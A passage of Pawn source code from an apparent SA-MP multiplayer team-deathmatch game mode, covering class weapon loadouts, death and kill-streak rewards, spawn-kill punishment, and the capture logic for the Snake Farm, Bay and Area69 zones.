		SetPlayerArmour(playerid, 100);
	}
	if(gTeam[playerid] == TEAM_PAKISTAN && gClass[playerid] == SNIPER)
	{
		SetPlayerColor(playerid, 0x97FF2900);
	}
	if(gTeam[playerid] == TEAM_INDIA && gClass[playerid] == SNIPER)
	{
        SetPlayerColor(playerid, 0xCED0C900);
	}
	if(gTeam[playerid] == TEAM_CHINA && gClass[playerid] == SNIPER)
	{
        SetPlayerColor(playerid, 0xFF200000);
	}
	if(gTeam[playerid] == TEAM_USA && gClass[playerid] == SNIPER)
	{
        SetPlayerColor(playerid, 0x009EFF00);
	}
	if(gTeam[playerid] == TEAM_NEPAL && gClass[playerid] == SNIPER)
	{
        SetPlayerColor(playerid, 0xD200FF00);
	}
	if(gTeam[playerid] == TEAM_DUBAI && gClass[playerid] == SNIPER)
	{
        SetPlayerColor(playerid, 0xFDE00000);
	}
	if(gTeam[playerid] == TEAM_ML && gClass[playerid] == SNIPER)
	{
        SetPlayerColor(playerid, 0xFD600000);
	}
	return 1;
}
stock GivePlayerWeapons(playerid)
{
	if(gClass[playerid] == SOLDIER)
	{
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 24, 450); //Deagle
		GivePlayerWeapon(playerid, 29, 450); //MP5
		GivePlayerWeapon(playerid, 31, 550); //M4
	}
	else if(gClass[playerid] == SNIPER)
	{
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 29, 450); //M4
		GivePlayerWeapon(playerid, 34, 100); //Sniper
		GivePlayerWeapon(playerid, 23, 300); //Silenced.
		GivePlayerWeapon(playerid, 4, 1); //Knife.
		//SniperColor(playerid);
	}
	else if(gClass[playerid] == PILOT)
	{
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 31, 500); //M4
		GivePlayerWeapon(playerid, 17, 5); //Shotgun
		GivePlayerWeapon(playerid, 23, 300); //Silenced.
	}
	else if(gClass[playerid] == ENGINEER)
	{
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 31, 200); //M4
		GivePlayerWeapon(playerid, 25, 50); //Shotgun
		GivePlayerWeapon(playerid, 24, 350); //Deagle
		GivePlayerWeapon(playerid, 16, 5); //Grenades
	}
	else if(gClass[playerid] == SUPPORT)
	{
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 27, 110); //Combat
		GivePlayerWeapon(playerid, 24, 450); //Deagle
		GivePlayerWeapon(playerid, 29, 450); //MP5
	}
	else if(gClass[playerid] == SCOUT)
	{
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 25, 110); //Sawn-off
		GivePlayerWeapon(playerid, 24, 100); //Deagle
		GivePlayerWeapon(playerid, 31, 250); //MP5
	}
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
if(DuelActive == true)
 {DuelActive = false;
  if(killerid != INVALID_PLAYER_ID && killerid != playerid)
   {new cName[32],tName[32],string[128];
    GetPlayerName(playerid,cName,sizeof(cName));
    GetPlayerName(killerid,tName,sizeof(tName));
    format(string,sizeof(string),"%s(%i) has won the duel against %s(%i) and has been given $%i as the reward",tName,killerid,cName,playerid,WinningPrice);
    SendClientMessageToAll(0xFF9900FF,string);
    SetPlayerInterior(killerid,0);
    SpawnPlayer(killerid);
    GivePlayerMoney(killerid,WinningPrice);}
  WinningPrice = 0;}
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
        if(Captured[playerid][SNAKE] == 0 && IsPlayerCapturing[playerid][SNAKE] == 1)
        {
			LeavingSnakeFarm(playerid);
		}
		if(Captured[playerid][BAY] == 0 && IsPlayerCapturing[playerid][BAY] == 1)
        {
			LeavingBay(playerid);
		}
		if(Captured[playerid][BIG] == 0 && IsPlayerCapturing[playerid][BIG] == 1)
		{
			LeavingEar(playerid);
		}
		if(Captured[playerid][ARMY] == 0 && IsPlayerCapturing[playerid][ARMY] == 1)
		{
			LeavingArmy(playerid);
		}
		if(Captured[playerid][PETROL] == 0 && IsPlayerCapturing[playerid][PETROL] == 1)
		{
			LeavingPetrol(playerid);
		}
		if(Captured[playerid][OIL] == 0 && IsPlayerCapturing[playerid][OIL] == 1)
		{
			LeavingOil(playerid);
		}
		if(Captured[playerid][DESERT] == 0 && IsPlayerCapturing[playerid][DESERT] == 1)
		{
			LeavingDesert(playerid);
		}
		if(Captured[playerid][QUARRY] == 0 && IsPlayerCapturing[playerid][QUARRY] == 1)
		{
			LeavingQuarry(playerid);
		}
		if(Captured[playerid][GUEST] == 0 && IsPlayerCapturing[playerid][GUEST] == 1)
		{
			LeavingGuest(playerid);
		}
		if(Captured[playerid][EAR] == 0 && IsPlayerCapturing[playerid][EAR] == 1)
		{
			LeavingEar(playerid);
		}
		if(Captured[playerid][AIRPORT] == 0 && IsPlayerCapturing[playerid][AIRPORT] == 1)
		{
			LeavingAirport(playerid);
		}
		if(Captured[playerid][SHIP] == 0 && IsPlayerCapturing[playerid][SHIP] == 1)
		{
			LeavingShip(playerid);
		}
		if(Captured[playerid][GAS] == 0 && IsPlayerCapturing[playerid][GAS] == 1)
		{
			LeavingGas(playerid);
		}
		if(Captured[playerid][RES] == 0 && IsPlayerCapturing[playerid][RES] == 1)
		{
			LeavingRes(playerid);
		}
		/*if(Captured[playerid][NPP] == 0 && IsPlayerCapturing[playerid][NPP] == 1)
		{
			LeavingNuclear(playerid);
		}*/
		if(Captured[playerid][MOTEL] == 0 && IsPlayerCapturing[playerid][MOTEL] == 1)
		{
			LeavingMOTEL(playerid);
		}
		if(Captured[playerid][BATTLESHIP] == 0 && IsPlayerCapturing[playerid][BATTLESHIP] == 1)
		{
			LeavingBattleShip(playerid);
		}
		if(Captured[playerid][HOSPITAL] == 0 && IsPlayerCapturing[playerid][HOSPITAL] == 1)
		{
			LeavingHospital(playerid);
		}
		if(IsPlayerInArea(playerid, -353.515625,2574.21875,-113.28125,2796.875))
		{
			if(gTeam[playerid] == TEAM_USA)
			{
				if(IsPlayerInAnyVehicle(killerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(killerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 520 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 425)
					{
						SetPlayerHealth(killerid, 0.0);
						new str[100];
						format(str, sizeof(str),"%s has been killed for spawn killing!", PlayerName2(killerid));
						SendClientMessageToAll(red, str);
					}
				}
			}
		}
		if(IsPlayerInArea(playerid, 994.1957, 1817.512, 1185.533, 2049.596))
		{
			if(gTeam[playerid] == TEAM_PAKISTAN)
			{
				if(IsPlayerInAnyVehicle(killerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(killerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 520 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 425)
					{
						SetPlayerHealth(killerid, 0.0);
						new str[100];
						format(str, sizeof(str),"%s has been killed for spawn killing!", PlayerName2(killerid));
						SendClientMessageToAll(red, str);
					}
				}
			}
		}
		if(IsPlayerInArea(playerid, -1599.869, 2545.777, -1389.667, 2697.589))
		{
			if(gTeam[playerid] == TEAM_NEPAL)
			{
				if(IsPlayerInAnyVehicle(killerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(killerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 520 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 425)
					{
						SetPlayerHealth(killerid, 0.0);
						new str[100];
						format(str, sizeof(str),"%s has been killed for spawn killing!", PlayerName2(killerid));
						SendClientMessageToAll(red, str);
					}
				}
			}
		}
		if(IsPlayerInArea(playerid, -309.375,1024.21875,103.125,1211.71875))
		{
			if(gTeam[playerid] == TEAM_CHINA)
			{
				if(IsPlayerInAnyVehicle(killerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(killerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 520 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 425)
					{
						SetPlayerHealth(killerid, 0.0);
						new str[100];
						format(str, sizeof(str),"%s has been killed for spawn killing!", PlayerName2(killerid));
						SendClientMessageToAll(red, str);
					}
				}
			}
		}
		if(IsPlayerInArea(playerid, -875.8406, 1389.667, -607.2495, 1623.225))
		{
			if(gTeam[playerid] == TEAM_INDIA)
			{
				if(IsPlayerInAnyVehicle(killerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(killerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 520 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 425)
					{
						SetPlayerHealth(killerid, 0.0);
						new str[100];
						format(str, sizeof(str),"%s has been killed for spawn killing!", PlayerName2(killerid));
						SendClientMessageToAll(red, str);
					}
				}
			}
		}
		if(IsPlayerInArea(playerid, -1628.90625,2513.671875,-1417.96875,2730.46875))
		{
			if(gTeam[playerid] == TEAM_DUBAI)
			{
				if(IsPlayerInAnyVehicle(killerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(killerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 520 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 425)
					{
						SetPlayerHealth(killerid, 0.0);
						new str[100];
						format(str, sizeof(str),"%s has been killed for spawn killing!", PlayerName2(killerid));
						SendClientMessageToAll(red, str);
					}
				}
			}
		}
		if(IsPlayerInArea(playerid, 1007.8125,-1371.09375,1212.890625,-1201.171875))
		{
			if(gTeam[playerid] == TEAM_ML)
			{
				if(IsPlayerInAnyVehicle(killerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(killerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 520 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 425)
					{
						SetPlayerHealth(killerid, 0.0);
						new str[100];
						format(str, sizeof(str),"%s has been killed for spawn killing!", PlayerName2(killerid));
						SendClientMessageToAll(red, str);
					}
				}
			}
		}
		SendDeathMessage(killerid, playerid, reason);
		GivePlayerMoney(killerid, 256);
		//---------
		SendClientMessage(killerid, -1, "You killed your enemy. You got 256$ and {00FF22}+1 Score. {FFFFFF}You got some ammo for your current weapon");
		new weaponid = GetPlayerWeapon(killerid);
		switch(weaponid)
		{
			case 2 .. 15: GivePlayerWeapon(killerid, GetPlayerWeapon(killerid), 1);
			case  16 .. 18: GivePlayerWeapon(killerid, GetPlayerWeapon(killerid), 1);
			case 22 .. 32: GivePlayerWeapon(killerid, GetPlayerWeapon(killerid), 60);
			case 35 .. 46: GivePlayerWeapon(killerid, GetPlayerWeapon(killerid), 1);
		}
		SetPlayerScore(killerid, GetPlayerScore(killerid) +1);
        Streak[playerid] = 0;
        if(killerid != INVALID_PLAYER_ID)
        {
            	new text[128];
                Streak[killerid] ++;
                if(Streak[killerid] == 3)
                {
                    	format(text, sizeof(text), "%s is is on (3 killing spree)!", PlayerName2(killerid));
                    	SendClientMessageToAll(orange, text);
                        SendClientMessage(killerid, lightblue, "You get $1500 and +2 score! (killing spree bonus)");
                        GivePlayerMoney(playerid, 1500);
                        GivePlayerScore(playerid, 2);
                }
                if(Streak[killerid] == 5)
                {
                    	format(text, sizeof(text), "%s is is on (5 killing spree)!", PlayerName2(killerid));
                        SendClientMessageToAll(orange, text);
                        SendClientMessage(killerid, lightblue, "You get $2500 and +3 score! (killing spree bonus)");
                        GivePlayerMoney(playerid, 2500);
                        GivePlayerScore(playerid, 3);
                }
                if(Streak[killerid] == 10)
                {
                    	format(text, sizeof(text), "%s is on (10 killing spree)!", PlayerName2(killerid));
                        SendClientMessageToAll(orange, text);
                        SendClientMessage(killerid, lightblue, "You get $5000 and +4 score! (killing spree bonus)");
                        GivePlayerMoney(playerid, 5000);
                        GivePlayerScore(playerid, 4);
                }
                if(Streak[killerid] == 15)
                {
                    	format(text, sizeof(text), "%s is is on (15 killing spree)!", PlayerName2(killerid));
                        SendClientMessageToAll(orange, text);
                        SendClientMessage(killerid, lightblue, "You get $7 500 and +6 score! (killing spree bonus)");
                        GivePlayerMoney(playerid, 7500);
                        GivePlayerScore(playerid, 6);
                }
                if(Streak[killerid] == 20)
                {
                    	format(text, sizeof(text), "%s is is on (20 killing spree)!", PlayerName2(killerid));
                        SendClientMessageToAll(orange, text);
                        SendClientMessage(killerid, lightblue, "You get $12 500 and +10 score! (killing spree bonus)");
                        GivePlayerMoney(playerid, 12500);
                        GivePlayerScore(playerid, 10);
                }
                if(Streak[killerid] == 25)
                {
                    	format(text, sizeof(text), "%s is is on (25 killing spree)!", PlayerName2(killerid));
                        SendClientMessageToAll(orange, text);
                        SendClientMessage(killerid, lightblue, "You get $20 000 and +15 score! (killing spree bonus)");
                        GivePlayerMoney(playerid, 20000);
                        GivePlayerScore(playerid, 15);
                }
                if(Streak[killerid] == 50)
                {
                    	format(text, sizeof(text), "%s is on (50 killing spree)!", PlayerName2(killerid));
                        SendClientMessageToAll(orange, text);
                        SendClientMessage(killerid, lightblue, "You get $50 000 and +20 score! (killing spree bonus)");
                        GivePlayerMoney(playerid, 50000);
                        GivePlayerScore(playerid, 20);
                }
                if(Streak[killerid] == 100)
                {
                    	format(text, sizeof(text), "%s is on (100 killing spree)!", PlayerName2(killerid));
                        SendClientMessageToAll(orange, text);
                        SendClientMessage(killerid, lightblue, "You get $1 00 000 and +20 score! (killing spree bonus)");
                        GivePlayerMoney(playerid, 100000);
                        GivePlayerScore(playerid, 20);
                }
        }
	    Anti_heal[playerid] = 0;
	    Anti_Give[playerid] = 0;
	    PlayerInfo[playerid][Deaths] ++;
	    PlayerInfo[killerid][Kills] ++;

		#if defined ENABLE_SPEC
		for(new x=0; x<MAX_PLAYERS; x++)
		    if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid)
		       AdvanceSpectate(x);
		#endif
		return 1;
}
stock GivePlayerScore(playerid, score)
{
        SetPlayerScore(playerid, GetPlayerScore(playerid)+score);
        return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid)
{
	if(gTeam[issuerid] == gTeam[playerid])
	{
	   	GameTextForPlayer(issuerid,"~r~Don't attack your team mates!", 3000, 3);
	}
	if(issuerid != INVALID_PLAYER_ID)
	{
	  	new str[26];
	  	format(str, sizeof(str),"-%.0f", amount);
      	SetPlayerChatBubble(playerid, str, 0xFF0000FF, 100.0, 2000);
      	PlayerPlaySound(issuerid,17802,0.0,0.0,0.0);
	}
	if(PlayerInfo[playerid][OnDuty] == 1 || PlayerInfo[playerid][God] == 1)
	{
		SetPlayerHealth(playerid, 1000.0);
		GameTextForPlayer(issuerid,"~r~Don't attack admins on-duty!", 3000, 3);
	}
    return 1;
}
//================================CAPTURE ZONES=================================
stock CaptureZoneMessage(playerid, messageid)
{
	switch(messageid)
	{
	   case 1:
	   {
		   SendClientMessage(playerid, red,"You cannot capture while in vehicle!");
	   }
	   case 2:
	   {
           SendClientMessage(playerid, red,"This zone is already being taken over!");
	   }
	   case 3:
	   {
           SendClientMessage(playerid, red,"You cannot capture while on-duty or spectating");
       }
	}
	return 1;
}
//===============SNAKE FARMS====================================================
stock ActiveSnakeFarm(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[SNAKE] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[SNAKE] = 1;
			 	timer[playerid][SNAKE] = SetTimerEx("SnakeFarm", 25000, false,"i",playerid);
			 	Captured[playerid][SNAKE] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_PAKISTAN_COLOR);
				}
			   	else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[SNAKE] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Snakes Farm is under attack!");
			    }
			    else if(tCP[SNAKE] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Snakes Farm is under attack!");
			    }
			    else if(tCP[SNAKE] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Snakes Farm is under attack!");
			    }
			    else if(tCP[SNAKE] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Snakes Farm is under attack!");
				}
				else if(tCP[SNAKE] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Snakes Farm is under attack!");
				}
				else if(tCP[SNAKE] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Snakes Farm is under attack!");
				}
				else if(tCP[SNAKE] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Snakes Farm is under attack!");
				}
				else if(tCP[SNAKE] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][SNAKE] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock SnakeFarmCaptured(playerid)
{
	Captured[playerid][SNAKE] = 1;
	UnderAttack[SNAKE] = 0;
	KillTimer(timer[playerid][SNAKE]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][SNAKE] = 25;
    GivePlayerScore(playerid, 3);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Snake Farm\" you received +3 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][SNAKE] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Snakes farm"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[SNAKE] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[SNAKE]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Snakes Farm\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingSnakeFarm(playerid)
{
	Captured[playerid][SNAKE] = 1;
	UnderAttack[SNAKE] = 0;
	KillTimer(timer[playerid][SNAKE]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][SNAKE] = 25;
    GangZoneStopFlashForAll(Zone[SNAKE]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][SNAKE] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward SnakeFarm(playerid);
public SnakeFarm(playerid)
{
	SnakeFarmCaptured(playerid);
	return 1;
}
//===============================[BAY]==========================================
stock ActiveBay(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[BAY] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[BAY] = 1;
			 	timer[playerid][BAY] = SetTimerEx("Bay", 25000, false,"i",playerid);
			 	Captured[playerid][BAY] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[BAY] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Bay is under attack!");
			    }
			    else if(tCP[BAY] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Bay is under attack!");
			    }
			    else if(tCP[BAY] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Bay is under attack!");
			    }
			    else if(tCP[BAY] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Bay is under attack!");
				}
				else if(tCP[BAY] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Bay is under attack!");
				}
				else if(tCP[BAY] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Bay is under attack!");
				}
				else if(tCP[BAY] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Bay is under attack!");
				}
				else if(tCP[BAY] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][BAY] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock BayCaptured(playerid)
{
	Captured[playerid][BAY] = 1;
	UnderAttack[BAY] = 0;
	KillTimer(timer[playerid][BAY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][BAY] = 25;
    GivePlayerScore(playerid, 3);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Bay\" you received +3 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][BAY] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Bay"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[BAY] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[BAY]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[BAY], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[BAY], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[BAY], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[BAY], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[BAY], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[BAY], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[BAY], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Bay\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingBay(playerid)
{
	Captured[playerid][BAY] = 1;
	UnderAttack[BAY] = 0;
	KillTimer(timer[playerid][BAY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][BAY] = 25;
    GangZoneStopFlashForAll(Zone[BAY]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][BAY] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Bay(playerid);
public Bay(playerid)
{
	BayCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveArea69(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[BIG] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[BIG] = 1;
			 	timer[playerid][BIG] = SetTimerEx("Area69", 25000, false,"i",playerid);
			 	Captured[playerid][BIG] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_USA_COLOR);
				}
                else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[BIG] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Area69 is under attack!");
			    }
			    else if(tCP[BIG] == TEAM_DUBAI)
			    {
